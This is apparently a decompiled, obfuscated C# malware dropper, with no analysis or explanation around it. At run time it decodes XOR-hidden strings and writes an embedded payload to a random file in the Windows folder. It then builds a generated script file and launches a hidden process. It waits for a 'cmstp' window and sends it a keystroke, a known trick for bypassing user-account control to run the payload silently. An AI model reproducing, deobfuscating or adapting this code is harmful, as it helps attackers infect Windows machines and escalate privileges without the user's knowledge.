using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class GClass0
{
	public static string string_0 = smethod_3("křɋ\u035fџՂم\u0747\u0875भ\u0a75\u0b4c\u0c43\u0d4dใཕၕᅭቻጠᐸᕸᙲᝰ\u187b\u1976\u1a71᭺\u1c30ᴙṓή\u2066Ⅾ≠⍮⑩╯♃❇⡎⤺⨴⬫ⰱⴉ⸈⽚い㆚㊘㎜㒉㖗㚎㞰㢖㦄㪂㮔㲘㶟㺯㿻䂳䆚䊝䎙䒃䖆䚮䞌䢛䦓䪏䮋䲅䶗事侎傎凢劝厨咯喯嚓垷墫妣媒宰岧嶧庁徴悳憻抧探撢斊暦枥條榴檣殷沷淉源澴炮燯狌珘瓯痞盎矌磈秴站篘糙緒络翕胃膒苼菘蓂藻蛘蟌裻观諒诐賔跠軍迌郍釾鋰鏹铯闈雿韺飬駾髹鯻鲞鶙黉鿃ꃥꇡꋞꏿꓩꗘꛯꟽꣽ꧷\uaac5\uabea곩귮껣꿯냤넌눭댘됟딏똓뜖렖뤪멼뭎뱔봰븝뼜쀝섎숀쌉쐟앋옢윌젚줂쩆쬒찍촏츎콁퀂턺퉾팯퐩픵홺휛\ud83d\ud931\uda39\udb27\udc31\udd73\ude01\udf34\ue024\ue13a\ue23e\ue36d\ue40e\ue52e\ue62d\ue720\ue826\ue934\uea66\ueb31\uec2b\ued63\uee2b\uef2f\uf033\uf14b\uf25f\uf351\uf450\uf531\uf668\uf77c\uf868糧勺ﭶﱱﵬﹱｾ}Ţɯ\u0363Ѩմ٦ݠࡦ\u0962ਬ\u0b51\u0c45\u0d50\u0e49ཊ၉ᅳቲጽᐳᕒᙗ\u1739\u187b\u197a\u1a65᭡ᱤᴽṷὩ⁵ℯ∡⍋␆━♑❊⡽⥴⩲⭌ⱪ⵰\u2e76⽅づㆌ㊊㎮㒙㖘㚎㞐㢗㦙㪷㮙㲘㶦㺁㾔䂂䆜䊳䏧䓘䗒䛚䟙䣘䧋䫒䯜䳔䷓仓俜傡决劲厈咏喾嚨垆墔妓媟宑岇嶶庱徥悹憠抠握擬旼曀柃梓榆檪殩沑涐溧澳炟燳狺珴瓸痨盟矚磌秞站篛糩綹纐翹胻臣苣莏蒀薋蚈蟺裧觡諲诲賥跱軧追郭釶鋽鏯铳门雵響飬駋髁鯼鳺鷷黽鿦ꃣꇓꋍꏸ꓾ꗹꛯ\ua7e7꣼꧑ꫣ꯷곷귪껭꿯냜넾눎댍둜딫똛뜍렐뤄먪묶밹봾븵뼣쁃셝쉀쌨쐴씮왈읅졈쥅쨶쬗찋촅츋켍퀅턖툰팮퐨픺혶휵\ud808\ud936\uda22\udb3d\udc76\udd7f\ude72\udf73\ue075\ue11a\ue220\ue328\ue434\ue53b\ue62f\ue72a\ue83c\ue922\uea22\ueb00\uec36\ued31\uee2d\uef33\uf065\uf11d\uf212\uf31d\uf41e\uf519\uf630\uf733\uf863磻既קּﱝﵝ﹕ｂmĥɽ\u0348ў՝ك\u074aࡍ३\u0a47\u0b48\u0c41ഞ\u0e00རၒᅶታ፮ᑳᕵᘸ\u1713ᡋ\u197f\u1a79᭧ᱠᵀṤὲ⁞Ⅾ≣⍨\u2431┩♉❻⡡⥪⩵⭪ⱪⴡ⸈⼋");

	public static string string_1 = smethod_3("~Ħɇ\u036dѰնٳݹࡢ१\u0a4fୡ౨\u0d63\u0e7bཫ\u1060ᄿሹፖᑪᕥᙴ\u1772ᡵ\u192a\u1a66᭺ᱤ");

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr intptr_0, int int_0);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool SetForegroundWindow(IntPtr intptr_0);

	public static string smethod_0(string string_2)
	{
		string value = Path.GetRandomFileName().Split(new char[1] { Convert.ToChar(smethod_3("/")) })[0];
		string value2 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + smethod_3("YŰɦ\u036fѱ");
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(value2);
		stringBuilder.Append(smethod_3("]"));
		stringBuilder.Append(value);
		stringBuilder.Append(smethod_3("*Ūɬ\u0367"));
		StringBuilder stringBuilder2 = new StringBuilder(string_0);
		stringBuilder2.Replace(smethod_3("FŖɂ\u035dёՌ\u064bݒࡏ\u0944\u0a47\u0b44\u0c49\u0d49โཚ၈ᅊቌፄ"), string_2);
		File.WriteAllText(stringBuilder.ToString(), stringBuilder2.ToString());
		return stringBuilder.ToString();
	}

	public static void Main()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + smethod_3("Zűɡ\u036eѲ՝") + Path.GetRandomFileName().Split(new char[1] { Convert.ToChar(smethod_3("/")) })[0] + smethod_3("*Ŧɺ\u0364");
			File.WriteAllBytes(text, smethod_2(smethod_3("rŢɯͼѬըرݣ\u0873ॡ\u0a77")));
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(smethod_0(smethod_3("mŠɨ\u032bХժبݴ\u0872।੶୷ఢണ") + text + smethod_3("#")));
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_1);
			processStartInfo.Arguments = smethod_3("+Ţɷ\u0321") + stringBuilder.ToString();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			IntPtr intPtr = default(IntPtr);
			intPtr = IntPtr.Zero;
			do
			{
				intPtr = smethod_1(smethod_3("fũɰͶѱ"));
			}
			while (intPtr == IntPtr.Zero);
			SendKeys.SendWait(smethod_3("|Ńɋ\u0350цՐټ"));
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public static IntPtr smethod_1(string string_2)
	{
		Process[] processesByName = Process.GetProcessesByName(string_2);
		if (processesByName.Length == 0)
		{
			return IntPtr.Zero;
		}
		processesByName[0].Refresh();
		IntPtr intPtr = default(IntPtr);
		intPtr = processesByName[0].MainWindowHandle;
		if (intPtr == IntPtr.Zero)
		{
			return IntPtr.Zero;
		}
		SetForegroundWindow(intPtr);
		ShowWindow(intPtr, 5);
		return intPtr;
	}

	private static byte[] smethod_2(string string_2)
	{
		ResourceManager resourceManager = new ResourceManager(smethod_3("jŠɤ\u036bгժط\u0731\u0873ॠ੧"), Assembly.GetExecutingAssembly());
		return (byte[])resourceManager.GetObject(string_2);
	}

	private static string smethod_3(string string_2)
	{
		int length = string_2.Length;
		char[] array = new char[length];
		for (int i = 0; i < array.Length; i++)
		{
			char c = string_2[i];
			byte b = (byte)(c ^ (length - i));
			byte b2 = (byte)(((int)c >> 8) ^ i);
			array[i] = (char)((b2 << 8) | b);
		}
		return string.Intern(new string(array));
	}
}
